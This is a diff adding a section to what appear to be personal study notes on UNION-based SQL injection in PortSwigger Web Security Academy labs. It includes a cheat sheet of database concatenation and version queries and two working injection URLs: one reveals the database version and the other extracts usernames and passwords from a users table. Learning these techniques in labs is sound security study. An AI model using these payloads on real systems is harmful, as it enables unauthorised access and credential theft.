@@ -53,3 +53,34 @@ NB// The reason why the above query works is because:
 a) The table gifts and user both contain 2 columns and hence the need for step 1 where we enumerated the number of columns we were looking for a table that contains
 the same number of columns as our user table that contains the username and password columns
 b) The password which is the second column of database users is of type string just like the description column in table gifts which is the second column and of type string
+
+5. Output data from other tables 
+
+Goal : retrieve usernames and passwords from table users
+- Determine the type of database in use because different databases use different operators to perform database actions see cheatsheet below:
+e.g string concatenation
+String concatenation
+
+You can concatenate together multiple strings to make a single string.
+Oracle 	'foo'||'bar'
+Microsoft 	'foo'+'bar'
+PostgreSQL 	'foo'||'bar'
+MySQL 	'foo' 'bar' [Note the space between the two strings]
+CONCAT('foo','bar')
+
+Database version
+
+You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
+Oracle 	SELECT banner FROM v$version
+SELECT version FROM v$instance
+Microsoft 	SELECT @@version
+PostgreSQL 	SELECT version()
+MySQL 	SELECT @@version 
+
+In a query:
+https://ac111f201ee804f0c12017f4004f002f.web-security-academy.net/filter?category=Tech+gifts'UNION select NULL,version()--
+Query and database details get reflected on the page
+![Screenshot](img/checked-dbversion.png)
+
+with our database version in mind retrieve all username and passwords as follows:
+https://acc91fed1f128145c03d103200d8002c.web-security-academy.net/filter?category=Tech+gifts'UNION select NULL,username|| '*' || password from users--
